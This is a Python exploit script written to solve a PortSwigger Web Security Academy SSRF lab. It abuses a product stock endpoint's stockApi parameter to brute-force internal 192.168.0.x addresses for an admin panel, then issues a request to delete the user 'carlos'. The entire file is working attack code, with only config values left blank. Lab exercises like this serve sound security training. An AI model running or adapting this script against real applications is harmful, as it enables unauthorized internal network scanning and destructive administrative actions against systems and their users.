#!/usr/bin/env python3
"""
SSRF brute-forcer for PortSwigger 'Basic SSRF against back-end system' lab.
Iterates the final octet of 192.168.0.x to find the internal admin panel,
then deletes user 'carlos'.
"""
import requests
from urllib.parse import quote

# --- Config: update these to match YOUR lab instance ---
HOST = ""
SESSION = ""
# -------------------------------------------------------

BASE = f"https://{HOST}/product/stock"
HEADERS = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
}

session = requests.Session()

def send(internal_url: str) -> requests.Response:
    """POST a stockApi value (URL-encoded) to the stock endpoint."""
    data = f"stockApi={quote(internal_url, safe='')}"
    return session.post(BASE, headers=HEADERS, data=data, timeout=10)

def find_admin():
    print("[*] Scanning 192.168.0.0/24 for the admin panel...")
    for octet in range(256):
        url = f"http://192.168.0.{octet}:8080/admin"
        try:
            r = send(url)
        except requests.RequestException as e:
            print(f"    .{octet}: request error ({e})")
            continue

        # Dead hosts usually give 500 / connection errors in the body.
        # The real admin host returns 200 with the admin panel HTML.
        if r.status_code == 200:
            print(f"[+] Found admin panel at 192.168.0.{octet} "
                  f"(status {r.status_code}, len {len(r.text)})")
            return octet
        else:
            print(f"    .{octet}: status {r.status_code}, len {len(r.text)}")
    return None

def delete_carlos(octet: int):
    delete_url = (f"http://192.168.0.{octet}:8080"
                  f"/admin/delete?username=carlos")
    print(f"[*] Sending delete request: {delete_url}")
    r = send(delete_url)
    print(f"[+] Response status {r.status_code}, len {len(r.text)}")
    if "carlos" not in r.text or r.status_code in (200, 302):
        print("[+] carlos should be deleted — check the lab banner.")

if __name__ == "__main__":
    octet = find_admin()
    if octet is not None:
        delete_carlos(octet)
    else:
        print("[-] No admin panel found. Double-check HOST, SESSION, "
              "and that the lab is still running.")
